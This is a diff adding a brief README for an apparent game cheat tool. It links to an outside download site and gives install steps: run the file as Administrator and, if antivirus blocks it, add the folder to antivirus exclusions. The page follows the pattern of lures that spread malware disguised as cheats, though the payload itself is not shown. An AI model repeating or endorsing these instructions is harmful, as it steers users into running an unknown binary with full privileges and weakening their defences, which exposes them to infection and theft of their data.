@@ -1,0 +1,21 @@
+ MAIN DOWNLOAD: https://getcore.cc/
+
+ HOW TO INSTALL:
+
+1. Download the archive from the link above
+2. Extract to any folder
+3. Run the file as Administrator
+4. Follow the instructions
+5. Launch the game
+6. Press INSERT to open the menu
+
+  TROUBLESHOOTING:
+
+- If antivirus blocks the file — add folder to exclusions
+- If menu doesn't open — try DELETE or HOME keys
+- If game crashes — run as Administrator
+- If features don't work — check game version, download latest update
+
+Status: Active
+
+SUPPORT:  Open an Issue on GitHub
